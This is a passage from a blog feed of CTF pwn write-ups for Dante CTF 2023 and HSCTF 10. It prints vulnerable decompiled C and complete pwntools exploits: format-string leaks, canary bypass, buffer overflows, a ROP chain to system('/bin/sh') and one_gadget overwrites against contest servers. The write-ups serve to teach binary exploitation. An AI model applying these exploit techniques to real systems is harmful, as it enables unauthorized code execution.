name!\n&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Invalid position!\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v8 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&#x27;./notebookp&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;challs.dantectf.it&#x27;</span>, <span class="number">31530</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./notebookp&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx, name, num, date</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>, <span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, name)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, <span class="built_in">str</span>(num))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, date)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">remove</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>, <span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, name, num, date</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>, <span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, name)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, <span class="built_in">str</span>(num))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, date)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">view</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>, <span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, <span class="built_in">str</span>(idx)) <span class="comment"># fsb</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 4Î≤à</span></span><br><span class="line"><span class="comment"># libc, pie, stack </span></span><br><span class="line">add(<span class="number">1</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">31</span>, <span class="number">1</span> , <span class="string">b&#x27;aa/sss/%3$p&#x27;</span>)</span><br><span class="line">view(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;/0x&#x27;</span>)</span><br><span class="line">libc.address = <span class="built_in">int</span>(p.recv(<span class="number">12</span>), <span class="number">16</span>) - <span class="number">0x114a37</span></span><br><span class="line">info(<span class="string">&#x27;libc.address @ &#x27;</span> +<span class="built_in">hex</span>(libc.address))</span><br><span class="line"></span><br><span class="line">add(<span class="number">2</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">31</span>, <span class="number">1</span>, <span class="string">b&quot;aa/sss/%9$p&quot;</span>)</span><br><span class="line"></span><br><span class="line">view(<span class="number">2</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;/0x&#x27;</span>)</span><br><span class="line">canary = <span class="built_in">int</span>(p.recv(<span class="number">16</span>), <span class="number">16</span>)</span><br><span class="line">info(<span class="string">&#x27;canary @ &#x27;</span> +<span class="built_in">hex</span>(canary))</span><br><span class="line"></span><br><span class="line">one_gadget = [<span class="number">0x50a37</span>, <span class="number">0xebcf1</span>, <span class="number">0xebcf5</span>, <span class="number">0xebcf8</span>]</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">date = <span class="string">b&#x27;vv/vvv/1234&#x27;</span></span><br><span class="line">date += <span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line">date += <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x30</span>-<span class="number">0x8</span>-<span class="built_in">len</span>(date))</span><br><span class="line">date += p64(canary)</span><br><span class="line">date += p64(<span class="number">0</span>)</span><br><span class="line">date += p64(libc.address + one_gadget[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">add(<span class="number">3</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">31</span>, <span class="number">1</span>, date)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> Dante </category>
          
      </categories>
      
      
        <tags>
            
            <tag> fsb </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HSCTF 10 2023 Write ups (all pwn)</title>
      <link href="/230609-hsctf102023-PWN/"/>
      <url>/230609-hsctf102023-PWN/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/1984">https://ctftime.org/event/1984</a></li></ul><h2 id="doubler-228-solves-x2F-354-points"><a href="#doubler-228-solves-x2F-354-points" class="headerlink" title="doubler (228 solves &#x2F; 354 points)"></a>doubler (228 solves &#x2F; 354 points)</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">..</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Input: &quot;</span>);</span><br><span class="line"><span class="type">char</span> buffer[<span class="number">16</span>];</span><br><span class="line">fgets(buffer, <span class="number">16</span>, <span class="built_in">stdin</span>);</span><br><span class="line"><span class="type">int</span> val = atoi(buffer);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;val: %i\n&quot;</span>, val);</span><br><span class="line"><span class="keyword">if</span> (val &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Error: no negative numbers allowed!&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> doubled = <span class="number">2</span> * val;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Doubled: %i\n&quot;</span>, doubled);</span><br><span class="line"><span class="keyword">if</span> (doubled == <span class="number">-100</span>) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(flag);</span><br><span class="line">&#125;</span><br><span class="line">..</span><br></pre></td></tr></table></figure><p>The range of <code>int</code> is <code>‚Äì2,147,483,648 ~ 2,147,483,647</code>.</p><h3 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[jir4vvit@<span class="built_in">arch</span> doubler]$ ./chall</span><br><span class="line">Input: 2147483647</span><br><span class="line">Doubled: -2</span><br><span class="line">[jir4vvit@<span class="built_in">arch</span> doubler]$ ./chall</span><br><span class="line">Input: 2147483598</span><br><span class="line">Doubled: -100</span><br><span class="line">flag&#123;fake&#125;</span><br><span class="line">[jir4vvit@<span class="built_in">arch</span> doubler]$ nc doubler.hsctf.com 1337</span><br><span class="line">Input: 2147483598</span><br><span class="line">Doubled: -100</span><br><span class="line">flag&#123;double_or_nothing_406c561&#125;</span><br></pre></td></tr></table></figure><h2 id="ed-161-solves-x2F-407-points"><a href="#ed-161-solves-x2F-407-points" class="headerlink" title="ed (161 solves &#x2F; 407 points)"></a>ed (161 solves &#x2F; 407 points)</h2><p>You can find overflow like below. </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> input[<span class="number">24</span>];</span><br><span class="line">fgets(input, <span class="number">64</span>, <span class="built_in">stdin</span>);</span><br></pre></td></tr></table></figure><p>And there is <code>flag()</code> so let‚Äôs retrun to <code>flag()</code>. </p><h3 id="Solve-1"><a href="#Solve-1" class="headerlink" title="Solve"></a>Solve</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&#x27;./ed&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;ed.hsctf.com&#x27;</span>, <span class="number">1337</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./ed&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;f&#x27;</span> * <span class="number">0x28</span></span><br><span class="line">payload += p64(e.symbols[<span class="string">&#x27;flag&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># print(p.sendline(payload))</span></span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(<span class="string">&#x27;Q&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;real_programmers_use_butterflies&#125;</span><br></pre></td></tr></table></figure><h2 id="cat-145-solves-x2F-418-points"><a href="#cat-145-solves-x2F-418-points" class="headerlink" title="cat (145 solves &#x2F; 418 points)"></a>cat (145 solves &#x2F; 418 points)</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(buffer);</span><br></pre></td></tr></table></figure><p>format string bug</p><h3 id="Solve-2"><a href="#Solve-2" class="headerlink" title="Solve"></a>Solve</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&quot;./chall&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;cat.hsctf.com&quot;</span>, <span class="number">1337</span>)</span><br><span class="line">b = <span class="built_in">bytearray</span>()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">20</span>):</span><br><span class="line">p.sendline(<span class="string">f&quot;%<span class="subst">&#123;i&#125;</span>$p&quot;</span>.encode())</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">b += p32(<span class="built_in">int</span>(p.recvline(), <span class="number">16</span>))</span><br><span class="line"><span class="keyword">except</span> ValueError:</span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line"><span class="built_in">print</span>(b[b.index(<span class="string">b&quot;flag&#123;&quot;</span>):b.index(<span class="string">b&quot;&#125;&quot;</span>) + <span class="number">1</span>].decode())</span><br></pre></td></tr></table></figure><p>Actually, I got the flag without writing any code. I got this solved code from discord. :)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">%10$p %11$p %12$p %13$p %14$p </span><br><span class="line">flag&#123;cats_go_meow&#125;</span><br></pre></td></tr></table></figure><h2 id="ex-90-solves-x2F-454-points"><a href="#ex-90-solves-x2F-454-points" class="headerlink" title="ex (90 solves &#x2F; 454 points)"></a>ex (90 solves &#x2F; 454 points)</h2><p>simple rop.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> input[<span class="number">24</span>];</span><br><span class="line">fgets(input, <span class="number">128</span>, <span class="built_in">stdin</span>);</span><br></pre></td></tr></table></figure><p>You have to get libc version first by leaking libc address first. and then, just ROP!</p><h3 id="Solve-3"><a href="#Solve-3" class="headerlink" title="Solve"></a>Solve</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&#x27;./ex&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;ex.hsctf.com&#x27;</span>, <span class="number">1337</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./ex&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc6_2.31-0ubuntu9.9_amd64.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x4014f3</span></span><br><span class="line">ret = pop_rdi + <span class="number">1</span></span><br><span class="line">pop_rsi_r15 = <span class="number">0x4014f1</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span></span><br><span class="line">payload += p64(<span class="number">0x41414141</span>)</span><br><span class="line">payload += p64(pop_rdi) <span class="comment"># rbp</span></span><br><span class="line">payload += p64(e.got[<span class="string">&#x27;setvbuf&#x27;</span>]) <span class="comment"># ret</span></span><br><span class="line">payload += p64(e.plt[<span class="string">&#x27;puts&#x27;</span>]) <span class="comment"># ret</span></span><br><span class="line">payload += p64(e.sym[<span class="string">&#x27;main&#x27;</span>]) <span class="comment"># ret</span></span><br><span class="line">payload += <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x50</span></span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(<span class="string">&#x27;Q&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;?\n?\n&#x27;</span>)</span><br><span class="line">libc.address = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\0&#x27;</span>)) - libc.sym[<span class="string">&#x27;setvbuf&#x27;</span>]</span><br><span class="line">binsh = <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\0&#x27;</span>))</span><br><span class="line">info(<span class="built_in">hex</span>(libc.address))</span><br><span class="line">info(<span class="built_in">hex</span>(binsh))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span></span><br><span class="line">payload += p64(<span class="number">0x41414141</span>) <span class="comment"># rbp</span></span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(binsh)</span><br><span class="line">payload += p64(ret)</span><br><span class="line">payload += p64(libc.sym[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line">payload += p64(e.sym[<span class="string">&#x27;main&#x27;</span>]) <span class="comment"># ret</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(<span class="string">&#x27;Q&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;I_wonder_if_there&#x27;s_an_emacs_command_for_writing_pwn_exploits?&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> HSCTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Dante CTF 2023 - Sentence To Hell (Full Relro)</title>
      <link href="/230608-dantectf2023-sentence_to_hell/"/>
      <url>/230608-dantectf2023-sentence_to_hell/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/2000">https://ctftime.org/event/2000</a></li></ul><blockquote><p>Name a soul you want to send to hell and we‚Äôll handle the sentence.<br>Author: lillo<br>Easy<br><code>challs.dantectf.it:31531/tcp</code></p></blockquote><ul><li>[32 solves &#x2F; 420 points]</li></ul><p>POXXÏù∏Í∞Ä HCAMPÏóê Ïù¥Îü∞ Î¨∏Ï†úÎ•º Ï∂úÏ†úÌïòÎ†§Í≥† ÌñàÏóàÎçò Í∏∞ÏñµÏù¥ ÎÇúÎã§. ÏõêÍ∞ÄÏ†ØÏùÄ Ïä§ÌÉù ÏÉÅÌô©Ïóê ÏòÅÌñ•ÏùÑ ÎßéÏù¥ Î∞õÎäîÎã§Îäî ÏÇ¨Ïã§ÏùÑ ÏÉÅÍ∏∞ÏãúÌÇ¨ Ïàò ÏûàÎäî Ï¢ãÏùÄ Î¨∏Ï†úÏòÄÎã§. (Ïö∞Î∂ÑÌà¨ 22.04ÏóêÏÑúÎèÑ ÏõêÍ∞ÄÏ†ØÏù¥ ÏÇ¨Ïö©Í∞ÄÎä•ÌïòÎã§Îãà)</p><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><p>ÎèÑÏª§ÌååÏùºÏù¥ Ï£ºÏñ¥Ï°åÍ∏∞ ÎïåÎ¨∏Ïóê patchelfÎ∂ÄÌÑ∞ ÏßÑÌñâÌï¥Ï§¨Îã§. ÌôòÍ≤ΩÏùÄ Ïö∞Î∂ÑÌà¨ 22.04Ïù¥Îã§.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  _QWORD *addr; <span class="comment">// [rsp+8h] [rbp-18h] BYREF</span></span><br><span class="line">  __int64 value[<span class="number">2</span>]; <span class="comment">// [rsp+10h] [rbp-10h] BYREF</span></span><br><span class="line"></span><br><span class="line">  value[<span class="number">1</span>] = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Please, tell me your name: &quot;</span>);</span><br><span class="line">  fgets(your_name, <span class="number">12</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  your_name[<span class="built_in">strcspn</span>(your_name, <span class="string">&quot;\n&quot;</span>)] = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Hi, &quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(your_name);                            <span class="comment">// fsb</span></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot; give me a soul you want to send to hell: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%lu&quot;</span>, value);</span><br><span class="line">  getchar();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;and in which circle you want to put him/her: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%lu&quot;</span>, &amp;addr);</span><br><span class="line">  getchar();</span><br><span class="line">  *addr = value[<span class="number">0</span>];</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Done, bye!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>your_name</code> Î≥ÄÏàòÎäî bss ÏòÅÏó≠Ïóê Ï°¥Ïû¨ÌïúÎã§. Í∏ÄÏûêÏàòÎ•º 11ÏûêÍπåÏßÄÎßå Ï†ÅÏùÑ Ïàò ÏûàÍ∏∞ ÎïåÎ¨∏Ïóê (null Ìè¨Ìï®ÌïòÎ©¥ 12Ïûê) Ï£ºÏÜåÎ•º leakÌïòÎäî Îç∞Ïóê Ïì∏ Ïàò ÏûàÎã§. Í∑∏Î¶¨Í≥† ÏïÑÎûòÏôÄ Í∞ôÏù¥ ÏûÑÏùòÏì∞Í∏∞Í∞Ä Ï°¥Ïû¨ÌïúÎã§. </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000001375                 mov     rax, [rbp+value]</span><br><span class="line">.text:0000000000001379                 mov     rdx, [rbp+addr]</span><br><span class="line">.text:000000000000137D                 mov     [rdx], rax</span><br></pre></td></tr></table></figure><p>ÌïòÏßÄÎßå Full RelroÏù¥Í∏∞ ÎïåÎ¨∏Ïóê ÎçÆÏùÑ Ïàò ÏûàÎäî Íµ¨Í∞ÑÏù¥ ÎßéÏßÄ ÏïäÎã§. ÎåÄÌëúÏ†ÅÏúºÎ°ú gotÎ•º ÎçÆÏßÄ Î™ªÌïúÎã§. Ïù¥Îü¥ÏàòÎ°ù ÏõêÍ∞ÄÏ†ØÏùò Ï°¥Ïû¨Î•º Îñ†Ïò¨Î†§Ïïº ÌïúÎã§.</p><h2 id="Exploit-1"><a href="#Exploit-1" class="headerlink" title="Exploit 1"></a>Exploit 1</h2><ol><li>stack, pie leak</li><li>stack retÎ•º <code>_start</code>Î°ú ÎçÆÏñ¥ Ìïú Î≤à Îçî Ïã§ÌñâÎêòÎèÑÎ°ù Ìï®</li><li>libc, stack leak</li><li>one_gadget Ïò§ÌîÑÏÖã Í≥ÑÏÇ∞ ÌõÑ stack retÎ•º one_gadget[0]ÏúºÎ°ú ÎçÆÍ∏∞</li></ol><p>ÏõêÎûò Ìïú Î≤àÎßåÏóê stack retÎ•º one_gadgetÏúºÎ°ú ÎçÆÏùÑ Ïàò ÏûàÏßÄÎßå Ïä§ÌÉù ÏÉÅÌô©Ïù¥ ÎßûÏßÄ ÏïäÏïÑ ÏõêÍ∞ÄÏ†ØÏùÄ Ïã§ÌñâÎêòÏßÄ ÏïäÏïòÎã§. Ïù¥Îü¥ Îïê mainÏùÑ Ìïú Î≤à Îçî Ïã§ÌñâÏãúÏºú Ïä§ÌÉùÏóê Ï°∞Í∏à Î≥ÄÌôîÎ•º Ï£ºÍ≥†(?) ÏõêÍ∞ÄÏ†ØÏùÑ Ïã§ÌñâÏãúÌÇ§Îäî Î∞©Î≤ïÏù¥ ÏûàÎã§.</p><h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./sentencep&#x27;</span>)</span><br><span class="line"><span class="comment"># p = remote(&#x27;challs.dantectf.it&#x27;,31531)</span></span><br><span class="line">e = ELF(<span class="string">&#x27;./sentencep&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;%p_%13$p&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">stack_ret = <span class="built_in">int</span>(p.recv(<span class="number">12</span>), <span class="number">16</span>) + <span class="number">0x2148</span></span><br><span class="line">info(<span class="string">&#x27;stack_ret @ &#x27;</span> +<span class="built_in">hex</span>(stack_ret))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;_0x&#x27;</span>)</span><br><span class="line">e.address = <span class="built_in">int</span>(p.recvuntil(<span class="string">&#x27; &#x27;</span>).strip(), <span class="number">16</span>) - <span class="number">0x1229</span></span><br><span class="line">info(<span class="string">&#x27;pie @ &#x27;</span> +<span class="built_in">hex</span>(e.address))</span><br><span class="line"></span><br><span class="line">value = e.symbols[<span class="string">&#x27;_start&#x27;</span>]</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, <span class="built_in">str</span>(value))</span><br><span class="line">addr = stack_ret </span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, <span class="built_in">str</span>(addr))</span><br><span 